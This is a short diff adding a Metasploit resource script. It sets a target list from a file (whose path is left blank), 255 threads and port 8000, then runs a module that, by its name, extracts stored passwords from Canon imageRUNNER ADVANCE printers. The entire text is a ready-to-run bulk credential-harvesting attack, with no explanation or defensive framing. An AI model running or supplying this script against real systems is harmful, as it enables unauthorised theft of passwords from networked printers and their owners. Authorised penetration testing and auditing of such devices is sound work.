@@ -1,0 +1,6 @@
+setg RHOSTS file:
+setg THREADS 255
+setg RPORT 8000
+
+use auxiliary/scanner/printer/canon_iradv_pwd_extract
+run
